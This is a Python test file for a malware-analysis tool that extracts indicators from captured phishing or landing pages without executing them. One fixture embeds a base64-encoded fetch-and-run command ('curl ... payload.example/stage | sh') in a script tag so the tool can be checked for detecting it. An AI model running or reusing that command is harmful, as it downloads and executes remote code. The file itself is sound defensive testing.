from __future__ import annotations

import base64
import json
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest

ROOT = Path(__file__).resolve().parents[1]
SCRIPT = ROOT / "malware-analysis" / "scripts" / "extract-landing-indicators.py"


class LandingIndicatorTests(unittest.TestCase):
    def test_cli_extracts_structural_indicators_without_raw_decoded_command(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            command = b"curl -fsSL https://payload.example/stage | sh"
            encoded = base64.b64encode(command).decode("ascii")
            capture = root / "index.html"
            capture.write_text(
                "<html><head><meta http-equiv='refresh' "
                "content='0;url=https://redirect.example/path'></head>"
                "<body><a href='/install-command.txt'>Install</a>"
                "<script>const u='https://landing.example/download?x=1';"
                f"const blob='{encoded}';</script></body></html>",
                encoding="utf-8",
            )
            output = root / "report.json"
            result = subprocess.run(
                [sys.executable, str(SCRIPT), str(capture), "--output", str(output),
                 "--authorization-ref", "ROE-test"],
                text=True, capture_output=True, check=False,
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            report_text = output.read_text(encoding="utf-8")
            report = json.loads(report_text)
            self.assertEqual(report["network_access"], "none")
            self.assertEqual(report["execution"], "none")
            self.assertEqual(
                report["aggregate"]["domains"],
                ["landing.example", "payload.example", "redirect.example"],
            )
            record = report["files"][0]
            self.assertIn("/install-command.txt", record["relative_references"])
            candidate = record["decoded_candidates"][0]
            self.assertEqual(candidate["domains"], ["payload.example"])
            self.assertIn("curl", candidate["markers"])
            self.assertIn("shell-pipe", candidate["markers"])
            self.assertNotIn(command.decode("ascii"), report_text)

    def test_negative_fixtures_refuse_existing_output_and_size_overrun(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            capture = root / "page.html"
            capture.write_text("https://example.test/", encoding="utf-8")
            output = root / "report.json"
            output.write_text("preserve", encoding="utf-8")
            existing = subprocess.run(
                [sys.executable, str(SCRIPT), str(capture), "--output", str(output),
                 "--authorization-ref", "ROE-test"],
                text=True, capture_output=True, check=False,
            )
            self.assertNotEqual(existing.returncode, 0)
            self.assertIn("output already exists", existing.stderr)
            self.assertEqual(output.read_text(encoding="utf-8"), "preserve")

            fresh = root / "fresh.json"
            oversized = subprocess.run(
                [sys.executable, str(SCRIPT), str(capture), "--output", str(fresh),
                 "--authorization-ref", "ROE-test", "--max-bytes", "4"],
                text=True, capture_output=True, check=False,
            )
            self.assertNotEqual(oversized.returncode, 0)
            self.assertIn("exceeds --max-bytes", oversized.stderr)
            self.assertFalse(fresh.exists())


if __name__ == "__main__":
    unittest.main()
